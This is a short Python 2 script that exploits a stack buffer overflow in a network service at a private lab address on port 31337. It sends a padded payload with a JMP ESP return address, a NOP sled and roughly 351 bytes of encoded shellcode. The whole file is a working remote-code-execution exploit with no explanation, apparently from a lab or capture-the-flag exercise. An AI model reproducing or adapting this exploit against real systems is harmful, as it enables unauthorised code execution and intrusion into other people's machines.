import socket
import struct
ip="192.168.11.130"
port=31337


shellcode = ("\xd9\xe8\xd9\x74\x24\xf4\x5b\xba\x45\x39\x25\xa3\x29\xc9\xb1"
"\x52\x31\x53\x17\x03\x53\x17\x83\x86\x3d\xc7\x56\xf4\xd6\x85"
"\x99\x04\x27\xea\x10\xe1\x16\x2a\x46\x62\x08\x9a\x0c\x26\xa5"
"\x51\x40\xd2\x3e\x17\x4d\xd5\xf7\x92\xab\xd8\x08\x8e\x88\x7b"
"\x8b\xcd\xdc\x5b\xb2\x1d\x11\x9a\xf3\x40\xd8\xce\xac\x0f\x4f"
"\xfe\xd9\x5a\x4c\x75\x91\x4b\xd4\x6a\x62\x6d\xf5\x3d\xf8\x34"
"\xd5\xbc\x2d\x4d\x5c\xa6\x32\x68\x16\x5d\x80\x06\xa9\xb7\xd8"
"\xe7\x06\xf6\xd4\x15\x56\x3f\xd2\xc5\x2d\x49\x20\x7b\x36\x8e"
"\x5a\xa7\xb3\x14\xfc\x2c\x63\xf0\xfc\xe1\xf2\x73\xf2\x4e\x70"
"\xdb\x17\x50\x55\x50\x23\xd9\x58\xb6\xa5\x99\x7e\x12\xed\x7a"
"\x1e\x03\x4b\x2c\x1f\x53\x34\x91\x85\x18\xd9\xc6\xb7\x43\xb6"
"\x2b\xfa\x7b\x46\x24\x8d\x08\x74\xeb\x25\x86\x34\x64\xe0\x51"
"\x3a\x5f\x54\xcd\xc5\x60\xa5\xc4\x01\x34\xf5\x7e\xa3\x35\x9e"
"\x7e\x4c\xe0\x31\x2e\xe2\x5b\xf2\x9e\x42\x0c\x9a\xf4\x4c\x73"
"\xba\xf7\x86\x1c\x51\x02\x41\xe3\x0e\x07\x12\x8b\x4c\x17\x15"
"\xf7\xd8\xf1\x7f\x17\x8d\xaa\x17\x8e\x94\x20\x89\x4f\x03\x4d"
"\x89\xc4\xa0\xb2\x44\x2d\xcc\xa0\x31\xdd\x9b\x9a\x94\xe2\x31"
"\xb2\x7b\x70\xde\x42\xf5\x69\x49\x15\x52\x5f\x80\xf3\x4e\xc6"
"\x3a\xe1\x92\x9e\x05\xa1\x48\x63\x8b\x28\x1c\xdf\xaf\x3a\xd8"
"\xe0\xeb\x6e\xb4\xb6\xa5\xd8\x72\x61\x04\xb2\x2c\xde\xce\x52"
"\xa8\x2c\xd1\x24\xb5\x78\xa7\xc8\x04\xd5\xfe\xf7\xa9\xb1\xf6"
"\x80\xd7\x21\xf8\x5b\x5c\x41\x1b\x49\xa9\xea\x82\x18\x10\x77"
"\x35\xf7\x57\x8e\xb6\xfd\x27\x75\xa6\x74\x2d\x31\x60\x65\x5f"
"\x2a\x05\x89\xcc\x4b\x0c")

ptr_jmp_esp = 0x080414c3


payload =  "A" * 146 + struct.pack("<I", ptr_jmp_esp) + "\x90" * 16 + shellcode + "C" * (1024-150-16-351)
#payload += "D" * (1024-len(payload))

print "Sending %s bytes payload"%len(payload)
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip,port))
s.send(payload)
s.send("\n")
